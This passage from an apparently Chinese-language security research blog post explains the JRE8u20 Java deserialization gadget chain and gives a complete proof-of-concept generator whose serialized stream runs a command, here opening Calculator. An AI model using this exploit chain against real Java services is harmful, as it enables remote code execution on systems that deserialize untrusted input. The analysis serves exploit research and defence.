        TCObject.ObjectData data = new TCObject.ObjectData();
        // 将 passcode 添加到 WrapperClass 对象的数据区
        // 使得 WrapperClass.readObject 内部的 input.readObject 
        // 可以将它读出
        data.addData(passcode); 
        TCObject obj = new TCObject(ser);
        obj.addClassDescData(desc, data, true);
        ser.addObject(obj);
        // 这里最终写入的是一个 TC_REFERENCE
        ser.addObject(passcode); 
        ser.write("/tmp/ser");
        ObjectInputStream in = new ObjectInputStream(
        new FileInputStream(new File("/tmp/ser")));
        in.readObject();
        System.out.println(in.readObject());
    }
#### 给对象插入假成员
什么意思呢？序列化数据中，有一段名为 TC_CLASSDESC
的数据结构，此数据结构中保存了被序列化的对象所属的类的成员结构（有多少个成员，分别叫什么名字，以及都是什么类型的。）
还是拿上面的 Passcode 类来做例子，序列化一个 Passcode 类的对象后，你会发现它的 TC_CLASSDESC 的结构如下：
                TC_CLASSDESC - 0x72
                  className
                    Length - 31 - 0x00 1f    // 类名长度
                    Value - util.n1nty.testpayload.Passcode - 0x7574696c2e6e316e74792e746573747061796c6f61642e50617373636f6465    //类名
                  serialVersionUID - 0x00 00 00 00 00 00 00 64
                  newHandle 0x00 7e 00 02
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 1 - 0x00 01    // 成员数量，只有 1 个
                  Fields
                    0:
                      Object - L - 0x4c    
                      fieldName
                        Length - 8 - 0x00 08    // 成员名长度
                        Value - passcode - 0x70617373636f6465    // 成员名
                      className1
                        TC_STRING - 0x74    
                          newHandle 0x00 7e 00 03
                          Length - 18 - 0x00 12    // 成员类型名的长度
                          Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b    // 成员类型，为Ljava/lang/String;
如果我们在这段结构中，插入一个 Passcode 类中根本不存在的成员，也不会有任何问题。这个虚假的值会被反序列化出来，但是最终会被抛弃掉，因为
Passcode 中不存在相应的成员。但是如果这个值是一个对象的话，反序列化机制会为这个值分配一个 Handle。JRE8u20 中利用到了这个技巧来生成
AnnotationInvocationHandler 并在随后的动态代理对象中引用它。利用 ObjectOutputStream
我们是无法做到添加假成员的，这种场景下 SerialWriter 就派上了用场。（类似的技巧还有：在 TC_CLASSDESC 中把一个类标记为
SC_WRITE_METHOD，然后就可以向这个类的数据区域尾部随意添加任何数据，这些数据都会在这个类被反序列化的同时也自动被反序列化）
#### 回到主题 - Payload JRE8u20
上面已经分析过是什么问题导致了 Jdk7u21 不能在新版本中使用。也用了几个简单的实验来向大家展示了如何绕过这个问题。那么现在回到主题。
JRE8u20 中利用到了名为 java.beans.beancontext.BeanContextSupport 的类。 此类与上面实验所用到的
WrapperClass 的作用是一样的，只不过稍复杂一些。
大体步骤如下：
  1. JRE8u20 中向 HashSet 的 TC_CLASSDESC 中添加了一个假属性，属性的值就是BeanContextChild 类的对象。
  2. BeanContextSupport 在反序列化的过程中会读到 this.type 值为 Templates.class 的 AnnotationInvocationHandler 类的对象，因为 BeanContextChild 中有 try/catch，所以还原 AnnotationInvocationHandler 对象时出的异常被处理掉了，没有打断反序列化的逻辑。同时 AnnotationInvocationHandler 对象被分配了一个 handle。
  3. 然后就是继续 Jdk7u21 的流程，后续的 payload 直接引用了之前创建出来的 AnnotationInvocationHandler 。
pwntester 在 github 上传了他改的 Poc，但是因为他直接将序列化文件的结构写在了 Java 文件的一个数组里面，而且对象间的 handle
与 TC_REFERENCE 的值都需要人工手动修正，所以非常不直观。而且手动修正 handle 是一个很烦人的事情。
为了证明我不是一个理论派 :-) ，我用 SerialWriter 重新实现了整个 Poc。代码如下：（手机端看不全代码，在电脑上看吧）
    package util.n1nty.testpayload;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import util.Gadgets;
    import util.Reflections;
    import util.n1nty.gen.*;
    import javax.xml.transform.Templates;
    import java.beans.beancontext.BeanContextChild;
    import java.beans.beancontext.BeanContextSupport;
    import java.io.*;
    import java.util.HashMap;
    import java.util.Map;
    import static java.io.ObjectStreamConstants.*;
    public class TestRCE {
        public static Templates makeTemplates(String command) {
            TemplatesImpl templates = null;
            try {
                templates =  Gadgets.createTemplatesImpl(command);
                Reflections.setFieldValue(templates, "_auxClasses", null);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return templates;
        }
        public static TCObject makeHandler(HashMap map, Serialization ser) throws Exception {
            TCObject handler = new TCObject(ser) {
                @Override
                public void doWrite(DataOutputStream out, HandleContainer handles) throws Exception {
                    ByteArrayOutputStream byteout = new ByteArrayOutputStream();
                    super.doWrite(new DataOutputStream(byteout), handles);
                    byte[] bytes = byteout.toByteArray();
                    /**
                     * 去掉最后的 TC_ENDBLOCKDATA 字节。因为在反序列化 annotation invocation handler 的过程中会出现异常导致序列化的过程不能正常结束
                     * 从而导致 TC_ENDBLOCKDATA 这个字节不能被正常吃掉
                     * 我们就不能生成这个字节
                     * */
                    out.write(bytes, 0, bytes.length -1);
                }
            };
            // 手动添加  SC_WRITE_METHOD，否则会因为反序列化过程中的异常导致 ois.defaultDataEnd 为 true，导致流不可用。
            TCClassDesc desc = new TCClassDesc("sun.reflect.annotation.AnnotationInvocationHandler", (byte)(SC_SERIALIZABLE | SC_WRITE_METHOD));
            desc.addField(new TCClassDesc.Field("memberValues", Map.class));
            desc.addField(new TCClassDesc.Field("type", Class.class));
            TCObject.ObjectData data = new TCObject.ObjectData();
            data.addData(map);
            data.addData(Templates.class);
            handler.addClassDescData(desc, data);
            return handler;
        }
        public static TCObject makeBeanContextSupport(TCObject handler, Serialization ser) throws Exception {
            TCObject obj = new TCObject(ser);
            TCClassDesc beanContextSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextSupport");
            TCClassDesc beanContextChildSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextChildSupport");
            beanContextSupportDesc.addField(new TCClassDesc.Field("serializable", int.class));
            TCObject.ObjectData beanContextSupportData = new TCObject.ObjectData();
            beanContextSupportData.addData(1); // serializable
            beanContextSupportData.addData(handler);
            beanContextSupportData.addData(0, true); // 防止 deserialize 内再执行 readObject
            beanContextChildSupportDesc.addField(new TCClassDesc.Field("beanContextChildPeer", BeanContextChild.class));
            TCObject.ObjectData beanContextChildSupportData = new TCObject.ObjectData();
            beanContextChildSupportData.addData(obj); // 指回被序列化的 BeanContextSupport 对象
            obj.addClassDescData(beanContextSupportDesc, beanContextSupportData, true);
            obj.addClassDescData(beanContextChildSupportDesc, beanContextChildSupportData);
            return obj;
        }
        public static void main(String[] args) throws Exception {
            Serialization ser = new Serialization();
            Templates templates = makeTemplates("open /Applications/Calculator.app");
            HashMap map = new HashMap();
            map.put("f5a5a608", templates);
            TCObject handler = makeHandler(map, ser);
            TCObject linkedHashset = new TCObject(ser);
            TCClassDesc linkedhashsetDesc = new TCClassDesc("java.util.LinkedHashSet");
            TCObject.ObjectData linkedhashsetData = new TCObject.ObjectData();
            TCClassDesc hashsetDesc = new TCClassDesc("java.util.HashSet");
            hashsetDesc.addField(new TCClassDesc.Field("fake", BeanContextSupport.class));
            TCObject.ObjectData hashsetData = new TCObject.ObjectData();
            hashsetData.addData(makeBeanContextSupport(handler, ser));
            hashsetData.addData(10, true); // capacity
            hashsetData.addData(1.0f, true); // loadFactor
            hashsetData.addData(2, true); // size
            hashsetData.addData(templates);
            TCObject proxy = Util.makeProxy(new Class[]{Map.class}, handler, ser);
            hashsetData.addData(proxy);
            linkedHashset.addClassDescData(linkedhashsetDesc, linkedhashsetData);
            linkedHashset.addClassDescData(hashsetDesc, hashsetData, true);
            ser.addObject(linkedHashset);
            ser.write("/tmp/ser");
            ObjectInputStream in = new ObjectInputStream(new FileInputStream(new File("/tmp/ser")));
            System.out.println(in.readObject());
        }
    }
#### 参考资料
这一篇资料帮助非常大，整个 payload 的思路就是这篇文章提出来的。作者对序列化机制有长时间的深入研究。  
* * *
**欢迎关注作者公众号**
* * *